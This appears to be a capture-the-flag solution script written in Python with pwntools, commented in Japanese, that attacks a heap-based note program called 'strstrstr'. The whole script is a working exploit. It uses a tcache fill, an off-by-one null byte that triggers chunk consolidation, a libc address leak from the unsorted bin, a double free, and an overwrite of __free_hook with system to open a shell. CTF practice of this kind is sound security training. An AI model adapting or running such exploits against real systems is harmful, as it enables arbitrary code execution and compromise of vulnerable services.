from pwn import *

elf = ELF('strstrstr')
context.binary = elf

s = remote('localhost', 10008)

def store(index, string):
  s.sendlineafter('command: ', '0')
  s.sendlineafter('index: ', str(index))
  s.sendlineafter('string: ', string)

def show(index):
  s.sendlineafter('command: ', '1')
  s.sendlineafter('index: ', str(index))
  return s.recvline()[:-1]

def delete(index):
  s.sendlineafter('command: ', '2')
  s.sendlineafter('index: ', str(index))

# tcacheを埋めるためのチャンクを確保
for i in range(7):
  store(i, 'a'*0x80)
for i in range(7):
  store(7+i, 'a'*0xf0)

# チャンクA, B, Cを確保
A = 14
B = 15
store(A, 'a'*0x80)  # チャンクA
store(B, 'a'*0x10)  # チャンクB
for i in range(7):
  delete(i)
C = 0
store(C, 'a'*0xf0)  # チャンクC
store(1, 'a'*0x10)  # topとの統合を防ぐため

# チャンクAを解放
delete(A)

# チャンクCの、PREV_INUSEビットを0に、prev_sizeを0xb0にする
for i in range(8):
  delete(B)
  store(B, 'a'*(0x18-i))
delete(B)
store(B, b'a'*0x10+b'\xb0')

# チャンクCを解放
for i in range(7):
  delete(i+7)
delete(C)

# チャンクAを再度確保する
for i in range(7):
  store(i, 'a'*0x80)
store(A, 'a'*0x80)

# チャンクBを読み出すとunsortedのアドレスが得られる
unsorted = int.from_bytes(show(B), 'little')
libcbase = unsorted - (0x3ebc40+0x60)
print('libcbase', hex(libcbase))

# チャンクBと同じアドレスからチャンクを確保
B2 = 0
store(B2, 'a')

# Double free
delete(B)
delete(B2)

# __free_hook = system
libc = ELF('libc-2.27.so')
libc.address = libcbase
store(B, pack(libc.symbols.__free_hook))
store(B, 'a')
store(B, pack(libc.symbols.system))

# free("/bin/sh")
store(B, '/bin/sh')
delete(B)

s.interactive()
